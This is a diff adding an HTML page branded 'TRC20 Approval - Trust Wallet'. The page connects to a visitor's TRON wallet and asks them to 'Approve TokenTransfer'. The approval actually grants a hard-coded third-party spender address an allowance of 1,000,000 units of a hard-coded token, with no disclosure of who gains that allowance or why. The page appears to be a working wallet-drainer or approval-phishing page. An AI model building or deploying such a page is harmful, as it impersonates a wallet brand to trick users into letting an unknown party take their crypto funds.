@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TRC20 Approval - Trust Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; max-width: 500px; margin:auto; }
+    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
+    pre { background:#f4f4f4; padding:10px; margin-top:15px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h2>Connect TRON Wallet & Approve TokenTransfer</h2>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="approveBtn" disabled>Approve TokenTransfer</button>
+
+  <pre id="status"></pre>
+
+  <script>
+    const tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const spenderAddress = 'TX5H4BV3cRsMAo7EWEkZisCmjFZJnh2gdw';
+    const status = document.getElementById('status');
+
+    let tronWeb;
+
+    function log(msg) { status.textContent += msg + '\n'; }
+
+    async function connectWallet() {
+      if (window.tronWeb && window.tronWeb.ready) {
+        tronWeb = window.tronWeb;
+        log('Wallet connected: ' + tronWeb.defaultAddress.base58);
+        document.getElementById('approveBtn').disabled = false;
+      } else {
+        log('Please open this page in Trust Wallet / TronLink browser');
+      }
+    }
+
+    async function approveToken() {
+      try {
+        const amount = tronWeb.toSun('1000000'); // Change amount if needed
+        const contract = await tronWeb.contract().at(tokenAddress);
+        log('Sending approve transaction...');
+        const tx = await contract.approve(spenderAddress, amount).send();
+        log('Transaction sent: ' + tx);
+        log('Check in your wallet for confirmation.');
+      } catch (err) {
+        log('Error: ' + err.message);
+      }
+    }
+
+    document.getElementById('connectBtn').addEventListener('click', connectWallet);
+    document.getElementById('approveBtn').addEventListener('click', approveToken);
+  </script>
+</body>
+</html>
